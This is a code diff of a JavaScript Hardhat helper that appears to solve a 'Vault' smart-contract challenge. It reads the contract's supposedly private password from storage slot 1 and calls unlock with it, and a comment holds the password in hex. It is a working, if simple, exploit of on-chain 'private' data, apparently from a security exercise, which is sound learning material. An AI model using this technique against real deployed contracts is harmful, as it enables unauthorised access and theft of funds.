@@ -1,5 +1,4 @@
 const { expect } = require("chai");
-// const { ethers } = require("hardhat");
 
 const helper = async (victim) => {
   /* 
@@ -9,15 +8,13 @@ const helper = async (victim) => {
     Vault directly
   */
 
-  // need to pass in the same password as the one in the contract
-  // read from private var in contract
-  // pass in
-  /// ethers.getStorageAt()
-  console.log("ethers", ethers);
-  const zeroStorageSlot = await ethers.getStorageAt(victim.address, 0);
-  console.log("zeroStorageSlot", zeroStorageSlot);
-  const passwordStorageSlot = await ethers.getStorageAt(victim.address, 1);
-  console.log("passwordStorageSlot", passwordStorageSlot);
+  // 0x412076657279207374726f6e672070617373776f726400000000000000000000
+  const passwordStorageSlot = await ethers.provider.getStorageAt(
+    victim.address,
+    1
+  );
+
+  await victim.unlock(passwordStorageSlot);
 };
 
 module.exports = { helper };
